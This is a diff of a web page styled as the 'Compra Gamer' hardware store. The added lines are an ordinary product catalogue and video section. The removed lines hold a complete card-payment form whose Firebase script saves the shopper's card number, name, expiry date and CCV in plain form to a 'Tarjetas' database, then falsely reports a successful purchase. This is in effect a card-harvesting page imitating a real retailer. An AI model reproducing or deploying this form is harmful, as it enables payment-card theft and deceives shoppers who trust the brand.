@@ -1,69 +1,11 @@
 <!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <meta http-equiv="X-UA-Compatible" content="ie=edge">
-    <title>Compra Gamer</title>
-    <link href="https://fonts.googleapis.com/css?family=Lato|Liu+Jian+Mao+Cao&display=swap" rel="stylesheet">
-    <link rel="stylesheet" href="https://github.com/MaxxHTML5/Exposicion/blob/39b35afd26fbff4798ca5115dacb721b4472046a/estilos2.css">
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-app.js";
-        import { getFirestore, collection, addDoc } from "https://www.gstatic.com/firebasejs/10.14.1/firebase-firestore.js";
-
-        const firebaseConfig = {
-            apiKey: "AIzaSyBWQzu66f5wO9UWW5S4axl7NluVJnRYREA",
-            authDomain: "camicazexmb.firebaseapp.com",
-            projectId: "camicazexmb",
-            storageBucket: "camicazexmb.appspot.com",
-            messagingSenderId: "532049772261",
-            appId: "1:532049772261:web:959c6cb4b9d2880fae5e0c",
-            measurementId: "G-9K2YJGJWNR"
-        };
-
-        const app = initializeApp(firebaseConfig);
-        const db = getFirestore(app);
-
-        window.submitForm = async function(event) {
-            event.preventDefault();
-
-            const cardNumber = document.getElementById('inputNumero').value.trim();
-            const cardName = document.getElementById('inputNombre').value.trim();
-            const expirationMonth = document.getElementById('selectMes').value;
-            const expirationYear = document.getElementById('selectYear').value;
-            const ccv = document.getElementById('inputCCV').value.trim();
-
-            if (!cardNumber || !cardName || expirationMonth === "Mes" || expirationYear === "Año" || !ccv) {
-                alert("Por favor, completa todos los campos.");
-                return;
-            }
-
-            try {
-                await addDoc(collection(db, 'Tarjetas'), {
-                    numeroTarjeta: cardNumber,
-                    nombre: cardName,
-                    expiracion: {
-                        mes: expirationMonth,
-                        año: expirationYear
-                    },
-                    ccv: ccv
-                });
-                alert('Compra exitoso!');
-                document.getElementById('formulario-tarjeta').reset();
-                window.location.href = "confirmacion.html";
-            } catch (error) {
-                alert('Error al registrar la tarjeta, sin conexion a internet: ' + error.message);
-            }
-        };
-    </script>
-</head>
-<!DOCTYPE html>
 <html lang="es">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <link rel="icon" href="Imagenes/logo.png" type="image/x-icon">
+    <link rel="icon" href="https://i.postimg.cc/13cYTRTM/logo.png" type="image/x-icon">
     <title>COMPRA GAMER</title>
+    <link rel="stylesheet" href="https://compragamer.neocities.org/css/estilosinicio.css">
 </head>
 <body>
     <header>
@@ -75,580 +17,305 @@
                 <li><a href="servicios.html" class="links">Servicios de Reparación</a></li>
             </ul>
         </nav>
-        <script>
-            window.addEventListener('scroll', function() {
-    const header = document.querySelector('header');
-    if (window.scrollY > 50) {
-        header.classList.add('scrolled');
-    } else {
-        header.classList.remove('scrolled');
-    }
-});
-        </script>
-        <style>
-header {
-    background: #333;
-    color: #fff;
-    padding: 20px;
-    text-align: center;
-    position: sticky;
-    top: 0;
-    z-index: 1000;
-    transition: all 0.3s ease;
-}
-
-header.scrolled {
-    padding: 10px;
-    font-size: 0.9rem;
-}
-
-header h1 {
-    margin: 0;
-    font-size: 1.8rem;
-    transition: font-size 0.3s ease;
-}
-
-.links {
-    color: white;
-    margin: 0 15px;
-    text-decoration: none;
-    transition: color 0.5s;
-}
-
-.links:hover {
-    color: #ff0000;
-}
-
-nav ul {
-    list-style: none;
-    padding: 0;
-}
-
-nav ul li {
-    display: inline;
-    margin: 0 15px;
-}
-
-.logo {
-    width: 20%;
-    height: auto; 
-}
-        </style>
     </header>
-<body>
-    <style>
-        * {
-	padding: 0;
-	margin: 0;
-	box-sizing: border-box;
-}
-
-body {
-	background: #ddeefc;
-	font-family: 'Lato', sans-serif;
-}
-
-.contenedor {
-	width: 90%;
-	max-width: 1000px;
-	padding: 40px 20px;
-	margin: auto;
-	display: flex;
-	flex-direction: column;
-	align-items: center;
-}
-
-.tarjeta {
-	width: 100%;
-	max-width: 550px;
-	position: relative;
-	color: #fff;
-	transition: .3s ease all;
-	transform: rotateY(0deg);
-	transform-style: preserve-3d;
-	cursor: pointer;
-	z-index: 2;
-}
-
-.tarjeta.active {
-	transform: rotateY(180deg);
-}
-
-.tarjeta > div {
-	padding: 30px;
-	border-radius: 15px;
-	min-height: 315px;
-	display: flex;
-	flex-direction: column;
-	justify-content: space-between;
-	box-shadow: 0 10px 10px 0 rgba(90,116,148,0.3);
-}
-
-.tarjeta .delantera {
-	width: 100%;
-	background: url(../img/bg-tarjeta/bg-tarjeta-03.jpg);
-	background-size: cover;
-}
-
-.delantera .logo-marca {
-	text-align: right;
-	min-height: 50px;
-}
-
-.delantera .logo-marca img {
-	width: 100%;
-	height: 100%;
-	object-fit: cover;
-	max-width: 80px;
-}
-
-.delantera .chip {
-	width: 100%;
-	max-width: 50px;
-	margin-bottom: 20px;
-}
-
-.delantera .grupo .label {
-	font-size: 16px;
-	color: #7d8994;
-	margin-bottom: 5px;
-}
-
-.delantera .grupo .numero,
-.delantera .grupo .nombre,
-.delantera .grupo .expiracion {
-	color: #fff;
-	font-size: 22px;
-	text-transform: uppercase;
-}
-
-.delantera .flexbox {
-	display: flex;
-	justify-content: space-between;
-	margin-top: 20px;
-}
-
-.trasera {
-	background: url(../img/bg-tarjeta/bg-tarjeta-03.jpg);
-	background-size: cover;
-	position: absolute;
-	top: 0;
-	transform: rotateY(180deg);
-	backface-visibility: hidden;
-}
-
-.trasera .barra-magnetica {
-	height: 40px;
-	background: #000;
-	width: 100%;
-	position: absolute;
-	top: 30px;
-	left: 0;
-}
-
-.trasera .datos {
-	margin-top: 60px;
-	display: flex;
-	justify-content: space-between;
-}
-
-.trasera .datos p {
-	margin-bottom: 5px;
-}
-
-.trasera .datos #firma {
-	width: 70%;
-}
-
-.trasera .datos #firma .firma {
-	height: 40px;
-	background: repeating-linear-gradient(skyblue 0, skyblue 5px, orange 5px, orange 10px);
-}
-
-.trasera .datos #firma .firma p {
-	line-height: 40px;
-	font-family: 'Liu Jian Mao Cao', cursive;
-	color: #000;
-	font-size: 30px;
-	padding: 0 10px;
-	text-transform: capitalize;
-}
-
-.trasera .datos #ccv {
-	width: 20%;
-}
-
-.trasera .datos #ccv .ccv {
-	background: #fff;
-	height: 40px;
-	color: #000;
-	padding: 10px;
-	text-align: center;
-}
-
-.trasera .leyenda {
-	font-size: 14px;
-	line-height: 24px;
-}
-
-.trasera .link-banco {
-	font-size: 14px;
-	color: #fff;
-}
-
-.contenedor-btn .btn-abrir-formulario {
-	width: 50px;
-	height: 50px;
-	font-size: 20px;
-	line-height: 20px;
-	background: #2364d2;
-	color: #fff;
-	position: relative;
-	top: -25px;
-	z-index: 3;
-	border-radius: 100%;
-	box-shadow: -5px 4px 8px rgba(24,56,182,0.4);
-	padding: 5px;
-	transition: all .2s ease;
-	border: none;
-	cursor: pointer;
-}
-
-.contenedor-btn .btn-abrir-formulario:hover {
-	background: #1850b1;
-}
-
-.contenedor-btn .btn-abrir-formulario.active {
-	transform: rotate(45deg);
-}
-
-.formulario-tarjeta {
-	background: #fff;
-	width: 100%;
-	max-width: 700px;
-	padding: 150px 30px 30px 30px;
-	border-radius: 10px;
-	position: relative;
-	top: -150px;
-	z-index: 1;
-	clip-path: polygon(0 0, 100% 0, 100% 0, 0 0);
-	transition: clip-path .3s ease-out;
-}
-
-.formulario-tarjeta.active {
-	clip-path: polygon(0 0, 100% 0, 100% 100%, 0 100%);
-}
-
-.formulario-tarjeta label {
-	display: block;
-	color: #7d8994;
-	margin-bottom: 5px;
-	font-size: 16px;
-}
-
-.formulario-tarjeta input,
-.formulario-tarjeta select,
-.btn-enviar {
-	border: 2px solid #CED6E0;
-	font-size: 18px;
-	height: 50px;
-	width: 100%;
-	padding: 5px 12px;
-	transition: .3s ease all;
-	border-radius: 5px;
-}
-
-.formulario-tarjeta input:hover,
-.formulario-tarjeta select:hover {
-	border: 2px solid #93BDED;
-}
-
-.formulario-tarjeta input:focus,
-.formulario-tarjeta select:focus {
-	outline: rgb(4,4,4);
-	box-shadow: 1px 7px 10px -5px rgba(90,116,148,0.3);
-}
-
-.formulario-tarjeta input {
-	margin-bottom: 20px;
-	text-transform: uppercase;
-}
-
-.formulario-tarjeta .flexbox {
-	display: flex;
-	justify-content: space-between;
-}
-
-.formulario-tarjeta .expira {
-	width: 100%;
-}
-
-.formulario-tarjeta .ccv {
-	min-width: 100px;
-}
-
-.formulario-tarjeta .grupo-select {
-	width: 100%;
-	margin-right: 15px;
-	position: relative;
-}
-
-.formulario-tarjeta select {
-	-webkit-appearance: none;
-}
-
-.formulario-tarjeta .grupo-select i {
-	position: absolute;
-	color: #CED6E0;
-	top: 18px;
-	right: 15px;
-	transition: .3s ease all;
-}
-
-.formulario-tarjeta .grupo-select:hover i {
-	color: #93bfed;
-}
-
-.formulario-tarjeta .btn-enviar {
-	border: none;
-	padding: 10px;
-	font-size: 22px;
-	color: #fff;
-	background: #2364d2;
-	box-shadow: 2px 2px 10px 0px rgba(0,85,212,0.4);
-	cursor: pointer;
-}
-
-.formulario-tarjeta .btn-enviar:hover {
-	background: #1850b1;
-}
-        </style>
-    <div class="contenedor">
-        <section class="tarjeta" id="tarjeta">
-            <div class="delantera">
-                <div class="logo-marca" id="logo-marca"></div>
-                <img src="img/chip-tarjeta.png" class="chip" alt="">
-                <div class="datos">
-                    <div class="grupo" id="numero">
-                        <p class="label">Número Tarjeta</p>
-                        <p class="numero">#### #### #### ####</p>
-                    </div>
-                    <div class="flexbox">
-                        <div class="grupo" id="nombre">
-                            <p class="label">Nombre Tarjeta</p>
-                            <p class="nombre">TU NOMBRE</p>
-                        </div>
-                        <div class="grupo" id="expiracion">
-                            <p class="label">Expiracion</p>
-                            <p class="expiracion"><span class="mes">MM</span> / <span class="year">AA</span></p>
-                        </div>
-                    </div>
-                </div>
-            </div>
-
-            <div class="trasera">
-                <div class="barra-magnetica"></div>
-                <div class="datos">
-                    <div class="grupo" id="firma">
-                        <p class="label">Firma</p>
-                        <div class="firma"><p></p></div>
-                    </div>
-                    <div class="grupo" id="ccv">
-                        <p class="label">CCV</p>
-                        <p class="ccv"></p>
-                    </div>
-                </div>
-                <p class="leyenda">Información adicional: Mantenga su tarjeta en un lugar seguro y nunca comparta su PIN o información de la tarjeta con nadie.</p>
-                <a href="#" class="link-banco">www.tubanco.com.ar</a>
-            </div>
-        </section>
-
-        <div class="contenedor-btn">
-            <button class="btn-abrir-formulario" id="btn-abrir-formulario">+
-                <i class="fas fa-plus"></i>
-            </button>
+        <h2 class="productos-inicio">Productos</h2>
+    <section id="productos">
+        <div class="producto" data-precio="90000">
+            <img src="https://i.postimg.cc/kgdWSJBN/Auriculares-Gamer-Hyperx-Cloud-Stinger-2-Negro.png" alt="Auriculares Gamer Hyperx Cloud Stinger 2 Negro">
+            <h3>Auriculares Gamer Hyperx Cloud Stinger 2 Negro</h3>
+            <p>Auriculares Gamer Hyperx Cloud Stinger 2 Negro.</p>
+            <p>Precio: $<span class="precio">90000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
         </div>
-
-        <form action="" id="formulario-tarjeta" class="formulario-tarjeta" onsubmit="submitForm(event)">
-            <div class="grupo">
-                <label for="inputNumero">Número Tarjeta</label>
-                <input type="text" id="inputNumero" maxlength="19" autocomplete="off" required>
-            </div>
-            <div class="grupo">
-                <label for="inputNombre">Nombre</label>
-                <input type="text" id="inputNombre" maxlength="30" autocomplete="off" required>
-            </div>
-            <div class="flexbox">
-                <div class="grupo expira">
-                    <label for="selectMes">Expiracion</label>
-                    <div class="flexbox">
-                        <div class="grupo-select">
-                            <select name="mes" id="selectMes" required>
-                                <option disabled selected>Mes</option>
-                            </select>
-                            <i class="fas fa-angle-down"></i>
-                        </div>
-                        <div class="grupo-select">
-                            <select name="year" id="selectYear" required>
-                                <option disabled selected>Año</option>
-                            </select>
-                            <i class="fas fa-angle-down"></i>
-                        </div>
-                    </div>
-                </div>
-                <div class="grupo ccv">
-                    <label for="inputCCV">CCV</label>
-                    <input type="text" id="inputCCV" maxlength="3" required>
-                </div>
-            </div>
-            <button type="submit" class="btn-enviar">Enviar</button>
-        </form>
+        <div class="producto" data-precio="99000">
+            <img src="https://i.postimg.cc/1Rf2tQn5/Auriculares-gamer-inal-mbricos-Logitech-G-G-Series-G435.png" alt="Auriculares gamer inalámbricos Logitech G G Series G435">
+            <h3>Auriculares gamer inalámbricos Logitech G G Series G435</h3>
+            <p>Auriculares gamer inalámbricos Logitech G G Series G435.</p>
+            <p>Precio: $<span class="precio">99000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="320000">
+            <img src="https://i.postimg.cc/65CH259w/Monitor-gamer-Gigabyte-G24-F-2-LCD-negro.png" alt="Monitor gamer Gigabyte G24F 2 LCD negro">
+            <h3>Monitor gamer Gigabyte G24F 2 LCD negro</h3>
+            <p>Monitor gamer Gigabyte G24F 2 LCD negro.</p>
+            <p>Precio: $<span class="precio">320000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="247000">
+            <img src="https://i.postimg.cc/jSKMz05f/Monitor-gamer-Samsung-Odyssey-G3-LCD-negro.png" alt="Monitor gamer Samsung Odyssey G3 LCD negro">
+            <h3>Monitor gamer Samsung Odyssey G3 LCD negro</h3>
+            <p>Monitor gamer Samsung Odyssey G3 LCD negro.</p>
+            <p>Precio: $<span class="precio">247000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="68000">
+            <img src="https://i.postimg.cc/TwSD3GzD/Disco-S-lido-Ssd-Interno-Kingston-Nv2-Snv2s-1tb.webp" alt="Disco Sólido Ssd Interno Kingston Nv2 Snv2s 1tb">
+            <h3>Disco Sólido Ssd Interno Kingston Nv2 Snv2s 1tb</h3>
+            <p>Disco Sólido Ssd Interno Kingston Nv2 Snv2s 1tb.</p>
+            <p>Precio: $<span class="precio">68000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="121000">
+            <img src="https://i.postimg.cc/nzMmxMPx/Enfriamiento-Asus-Rog-Ryuo-Iii-360-Argb.webp" alt="Enfriamiento Asus Rog Ryuo Iii 360 Argb">
+            <h3>Enfriamiento Asus Rog Ryuo Iii 360 Argb</h3>
+            <p>Enfriamiento Asus Rog Ryuo Iii 360 Argb.</p>
+            <p>Precio: $<span class="precio">121000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="80000">
+            <img src="https://i.postimg.cc/R0gt2wGG/Disco-s-lido-interno-Adata-Legend-800-Aleg-800-1000gcs-1-TB.webp" alt="Disco sólido interno Adata Legend 800 Aleg-800-1000gcs 1TB">
+            <h3>Disco sólido interno Adata Legend 800 Aleg-800-1000gcs 1TB</h3>
+            <p>Disco sólido interno Adata Legend 800 Aleg-800-1000gcs 1TB.</p>
+            <p>Precio: $<span class="precio">80000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="107000">
+            <img src="https://i.postimg.cc/s2jSnTPv/Cpu-Watercooling-Deepcool-Castle-360rgb.webp" alt="Cpu Watercooling Deepcool Castle 360rgb">
+            <h3>Cpu Watercooling Deepcool Castle 360rgb</h3>
+            <p>Cpu Watercooling Deepcool Castle 360rgb.</p>
+            <p>Precio: $<span class="precio">107000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="84000">
+            <img src="https://i.postimg.cc/qq3CtSrZ/Fuente-Corsair-750w-Rm750e-80-Plus-Gold.webp" alt="Fuente Corsair 750w Rm750e 80 Plus Gold">
+            <h3>Fuente Corsair 750w Rm750e 80 Plus Gold</h3>
+            <p>Fuente Corsair 750w Rm750e 80 Plus Gold.</p>
+            <p>Precio: $<span class="precio">84000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="199000">
+            <img src="https://i.postimg.cc/jCYnycdq/Fuente-De-Poder-Gigabyte-Ud850gm-850w.webp" alt="Fuente De Poder Gigabyte Ud850gm 850w">
+            <h3>Fuente De Poder Gigabyte Ud850gm 850w</h3>
+            <p>Fuente De Poder Gigabyte Ud850gm 850w.</p>
+            <p>Precio: $<span class="precio">199000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="102000">
+            <img src="https://i.postimg.cc/ry3bRPxG/Gabinete-Gamer-Asus-Rog-Strix-Gx601-Helios-Eatx.webp" alt="Gabinete Gamer Asus Rog Strix Gx601 Helios Eatx">
+            <h3>Gabinete Gamer Asus Rog Strix Gx601 Helios Eatx</h3>
+            <p>Gabinete Gamer Asus Rog Strix Gx601 Helios Eatx.</p>
+            <p>Precio: $<span class="precio">102000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="200000">
+            <img src="https://i.postimg.cc/L6PWt33c/Gabinete-Lian-Li-O11vx-Vision-Mid-Tower-negro.webp" alt="Gabinete Lian Li O11vx Vision Mid Tower negro">
+            <h3>Gabinete Lian Li O11vx Vision Mid Tower negro</h3>
+            <p>Gabinete Lian Li O11vx Vision Mid Tower negro.</p>
+            <p>Precio: $<span class="precio">200000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="234000">
+            <img src="https://i.postimg.cc/jSrFZn8L/Intel-Core-i5-10400.webp" alt="Intel Core i5-10400">
+            <h3>Intel Core i5-10400</h3>
+            <p>Intel Core i5-10400.</p>
+            <p>Precio: $<span class="precio">234000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="80000">
+            <img src="https://i.postimg.cc/DzvYKk3h/Memoria-Kingston-Fury-Beast-Rgb-16gb-Ddr4-3200mhz.webp" alt="Memoria Kingston Fury Beast Rgb 16gb Ddr4 3200mhz">
+            <h3>Memoria Kingston Fury Beast Rgb 16gb Ddr4 3200mhz</h3>
+            <p>Memoria Kingston Fury Beast Rgb 16gb Ddr4 3200mhz.</p>
+            <p>Precio: $<span class="precio">80000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="89000">
+            <img src="https://i.postimg.cc/s2THj63h/Memoria-RAM-Vengeance-RGB-Pro-gamer-color-negro-16-GB.webp" alt="Memoria RAM Vengeance RGB Pro gamer color negro 16GB">
+            <h3>Memoria RAM Vengeance RGB Pro gamer color negro 16GB</h3>
+            <p>Memoria RAM Vengeance RGB Pro gamer color negro 16GB.</p>
+            <p>Precio: $<span class="precio">89000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="86000">
+            <img src="https://i.postimg.cc/mDqdMPzZ/Mouse-Inalambrico-Pc-Logitech-Lightspeed-G-Series-G502.png" alt="Mouse Inalambrico Pc Logitech Lightspeed G Series G502">
+            <h3>Mouse Inalambrico Pc Logitech Lightspeed G Series G502</h3>
+            <p>Mouse Inalambrico Pc Logitech Lightspeed G Series G502.</p>
+            <p>Precio: $<span class="precio">86000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="78000">
+            <img src="https://i.postimg.cc/9QpJb8Rn/Rat-n-para-juegos-Redragon-ST4r-Pro-Wireless-BT.png" alt="Ratón para juegos Redragon ST4r Pro Wireless BT">
+            <h3>Ratón para juegos Redragon ST4r Pro Wireless BT</h3>
+            <p>Ratón para juegos Redragon ST4r Pro Wireless BT.</p>
+            <p>Precio: $<span class="precio">78000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="377000">
+            <img src="https://i.postimg.cc/05TWyJ1c/Placa-De-Video-Radeon-RX-7800-XT-16-Gb-Gigabyte-Gaming-Oc.webp" alt="Placa De Video Radeon RX 7800 XT 16Gb Gigabyte Gaming Oc">
+            <h3>Placa De Video Radeon RX 7800 XT 16Gb Gigabyte Gaming Oc</h3>
+            <p>Placa De Video Radeon RX 7800 XT 16Gb Gigabyte Gaming Oc.</p>
+            <p>Precio: $<span class="precio">377000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="178000">
+            <img src="https://i.postimg.cc/y6gpKytD/Placa-de-video-Nvidia-Asus-ROG-Strix-Ge-Force-RTX-40-Series-RTX-4060.webp" alt="Placa de video Nvidia Asus ROG Strix GeForce RTX 40 Series RTX 4060">
+            <h3>Placa de video Nvidia Asus ROG Strix GeForce RTX 40 Series RTX 4060</h3>
+            <p>Placa de video Nvidia Asus ROG Strix GeForce RTX 40 Series RTX 4060.</p>
+            <p>Precio: $<span class="precio">178000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="240000">
+            <img src="https://i.postimg.cc/KzKfZm96/Ryzen-5-5600g.png" alt="Ryzen-5-5600g">
+            <h3>Ryzen-5-5600g</h3>
+            <p>Ryzen-5-5600g.</p>
+            <p>Precio: $<span class="precio">240000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="99000">
+            <img src="https://i.postimg.cc/g024TV3k/Silla-de-escritorio-Razer-Iskur-X-gamer-ergon-mica.png" alt="Silla-de-escritorio-Razer-Iskur-X-gamer-ergonómica">
+            <h3>Silla-de-escritorio-Razer-Iskur-X-gamer-ergonómica</h3>
+            <p>Silla-de-escritorio-Razer-Iskur-X-gamer-ergonómica.</p>
+            <p>Precio: $<span class="precio">99000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="203000">
+            <img src="https://i.postimg.cc/g0t4FxKy/Silla-Gamer-Redragon-C211-bw.png" alt="Silla-Gamer-Redragon-C211-bw">
+            <h3>Silla-Gamer-Redragon-C211-bw</h3>
+            <p>Silla-Gamer-Redragon-C211-bw.</p>
+            <p>Precio: $<span class="precio">203000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="450000">
+            <img src="https://i.postimg.cc/sXtcxbqv/Tarjeta-Madre-Asus-Rog-B550-f-Gaming.png" alt="Tarjeta-Madre-Asus-Rog-B550-f-Gaming">
+            <h3>Tarjeta-Madre-Asus-Rog-B550-f-Gaming</h3>
+            <p>Tarjeta-Madre-Asus-Rog-B550-f-Gaming.</p>
+            <p>Precio: $<span class="precio">450000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="570000">
+            <img src="https://i.postimg.cc/L6FDpKjW/Tarjeta-Madre-Asus-Rog-Strix-Z690-e-Gaming.png" alt="Tarjeta-Madre-Asus-Rog-Strix-Z690-e-Gaming">
+            <h3>Tarjeta-Madre-Asus-Rog-Strix-Z690-e-Gaming</h3>
+            <p>Tarjeta-Madre-Asus-Rog-Strix-Z690-e-Gaming.</p>
+            <p>Precio: $<span class="precio">570000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="70000">
+            <img src="https://i.postimg.cc/4yV19BRw/Teclado-Mec-nico-Keychron-V1-Max-Red-Sw-itch-Luz-Rgb.png" alt="Teclado-Mecánico-Keychron-V1-Max-Red-Switch-Luz-Rgb">
+            <h3>Teclado-Mecánico-Keychron-V1-Max-Red-Switch-Luz-Rgb</h3>
+            <p>Teclado-Mecánico-Keychron-V1-Max-Red-Switch-Luz-Rgb.</p>
+            <p>Precio: $<span class="precio">70000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+        <div class="producto" data-precio="50000">
+            <img src="https://i.postimg.cc/v8VhkHx9/Teclado-Skyloong-Sk61-Coral-Sea-Gateron-Brown-Optico-60.png" alt="Imagenes/Teclado-Skyloong-Sk61-Coral-Sea-Gateron-Brown-Optico-60_.png">
+            <h3>Imagenes/Teclado-Skyloong-Sk61-Coral-Sea-Gateron-Brown-Optico-60_.png</h3>
+            <p>Imagenes/Teclado-Skyloong-Sk61-Coral-Sea-Gateron-Brown-Optico-60_.png.</p>
+            <p>Precio: $<span class="precio">50000</span></p>
+            <button onclick="agregarAlCarrito(this)">Agregar al Carrito</button>
+        </div>
+    </section>
+<br>
+<br>
+<br>
+<br>
+<br>
+    <section id="video-promocional" class="video-promocional">
+        <h2>Explora lo último en tecnología</h2>
+        <div>
+        <h1>Conoce la RTX 3080</h1>
+        <video controls autoplay muted width="800">
+            <source src="Videos/GeForce RTX 3080 _ 2nd Gen RTX _ The Ultimate Play - NVIDIA GeForce (720p, h264, youtube).mp4" type="video/mp4">
+            Tu navegador no soporta la reproducción de videos.
+        </video>
+        <h3 class="rtx-3080">El día de lanzamiento del RTX 3080 fue el 17 de septiembre de 2020. ​ La falta de funcionalidad de pre-pedido y la alta demanda exacerbada por la pandemia de COVID-19, y el aumento en el scalping, dieron como resultado que una gran cantidad de minoristas en línea tuvieran problemas con la gran cantidad de compras.</h3>
+        <br>
+        <br>
+        <br>
+        <br>
+<br>
     </div>
+    <div>
+        <h1>Conoce la RTX 4090</h1>
+        <video controls autoplay muted width="800">
+            <source src="Videos/GeForce RTX 4090 _ Beyond Fast - NVIDIA GeForce (720p, h264, youtube).mp4" type="video/mp4">
+            Tu navegador no soporta la reproducción de videos.
+        </video>
+        <h3>Tras su lanzamiento, el rendimiento de la RTX 4090 recibió elogios de los revisores y Tom's Hardware dijo que "ahora se encuentra entre las mejores tarjetas gráficas", Una revisión de PC Gamer le dio 83/100, calificándolo de "una gran introducción al tipo de rendimiento extremo que Ada puede ofrecer cuando se le da una correa larga", Tom Warren en una reseña para The Verge dijo que la RTX 4090 es "una bestia de tarjeta gráfica que marca una nueva era para los juegos de PC".​</h3>
+    </div>
+    </section>
 
-    <script src="https://kit.fontawesome.com/2c36e9b7b1.js" crossorigin="anonymous"></script>
-    <script src="https://compragamer.neocities.org/js/main.js"></script>
-</body>
-<footer>
-    <div class="footer-content">
-        <h3>Compra Gamer</h3>
-        <p>Tu tienda de confianza para productos y servicios de tecnología.</p>
-        <h4>Siguenos</h4>
-            <div class="icono-contenedor">
-                <a href="https://www.twitch.tv/compragamerok">
-                    <div class="icono-circulo">
-                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                            <path d="M2.149 0l-1.612 4.119v16.836h5.731v3.045h3.224l3.045-3.045h4.657l6.269-6.269v-14.686h-21.314zm19.164 13.612l-3.582 3.582h-5.731l-3.045 3.045v-3.045h-4.836v-15.045h17.194v11.463zm-3.582-7.343v6.262h-2.149v-6.262h2.149zm-5.731 0v6.262h-2.149v-6.262h2.149z"></path>
-                        </svg>
-                    </div>
-                </a>
-                <a href="https://x.com/CompraGamerOK">
-                    <div class="icono-circulo">
-                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 22 20">
-                            <path d="M17.244 0.25H20.552L13.325 8.51L21.827 19.75H15.17L9.956 12.933L3.99 19.75H0.679998L8.41 10.915L0.253998 0.25H7.08L11.793 6.481L17.244 0.25ZM16.083 17.77H17.916L6.084 2.126H4.117L16.083 17.77Z"></path>
-                        </svg>
-                    </div>
-                </a>
-                <a href="https://www.youtube.com/c/CompraGamer">
-                    <div class="icono-circulo">
-                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                            <path d="M19.615 3.184c-3.604-.246-11.631-.245-15.23 0-3.897.266-4.356 2.62-4.385 8.816.029 6.185.484 8.549 4.385 8.816 3.6.245 11.626.246 15.23 0 3.897-.266 4.356-2.62 4.385-8.816-.029-6.185-.484-8.549-4.385-8.816zm-10.615 12.816v-8l8 3.993-8 4.007z"></path>
-                        </svg>
-                    </div>
-                </a>
-                <a href="https://www.linkedin.com/company/newton-station-srl/mycompany/">
-                    <div class="icono-circulo">
-                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
-                            <path d="M4.98 3.5c0 1.381-1.11 2.5-2.48 2.5s-2.48-1.119-2.48-2.5c0-1.38 1.11-2.5 2.48-2.5s2.48 1.12 2.48 2.5zm.02 4.5h-5v16h5v-16zm7.982 0h-4.968v16h4.969v-8.399c0-4.67 6.029-5.052 6.029 0v8.399h4.988v-10.131c0-7.88-8.922-7.593-11.018-3.714v-2.155z"></path>
-                        </svg>
-                    </div>
-                </a>
-                <a href="https://www.instagram.com/compragamer_oficial/">
-                    <div class="icono-circulo">
-                        <svg class="icono-hover" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24">
